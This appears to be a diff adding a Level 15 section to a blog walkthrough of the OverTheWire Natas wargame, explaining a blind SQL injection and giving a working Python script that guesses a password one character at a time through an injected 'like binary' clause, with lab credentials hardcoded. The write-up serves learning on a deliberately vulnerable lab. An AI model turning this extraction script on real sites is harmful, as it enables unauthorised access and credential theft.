@@ -111,4 +111,46 @@ User input is passed straight in. Putting `" or "1"="1` forces the statement to 
 
 ## Level 15 ##
 
+This level is slightly different. The only information we get from submitting the form can be boiled down to whether or not the sql query executed successfully. The source code does give us the schema of the users table, and we can use this to our advantage. Even though we can't get the snippet to show us the password, we can try each character in turn and validate our guess. It's clearly tedious to do that manually, but a little bit of python3 takes good care of the automation:
 
+{% highlight python %}
+    import urllib.parse
+    import urllib.request
+    
+    url = 'http://natas15.natas.labs.overthewire.org/index.php'
+    
+    # auth bit - pretty boiler plate
+    top_level_url = 'http://natas15.natas.labs.overthewire.org'
+    username = 'natas15'
+    password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
+    password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
+    password_mgr.add_password(None, top_level_url, username, password)
+    handler = urllib.request.HTTPBasicAuthHandler(password_mgr)
+    opener = urllib.request.build_opener(handler)
+    urllib.request.install_opener(opener)
+    
+    def tryit(pw):
+      post_data = {'username' : 'natas16" and password like binary "%s%%' % pw}
+      data = urllib.parse.urlencode(post_data)
+      binary_data = data.encode('ascii')
+      req = urllib.request.Request(url, binary_data)
+      response = urllib.request.urlopen(req)
+      the_page = response.read()
+      return 'This user exists' in str(the_page)
+    
+    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' # string.ascii_letters + string.digits
+    
+    password = ''
+    while len(password) < 32:
+      for c in chars:
+        if tryit(password + c):
+          password = password + c
+          print('password starts with %s' % password)
+          break
+    
+    print('full password: %s' % password)
+{% endhighlight %}
+
+Note that `mysql` doesn't exactly have a `startswith` function, so we use `like binary "<guess>%"'.
+
+## Level 16 ##
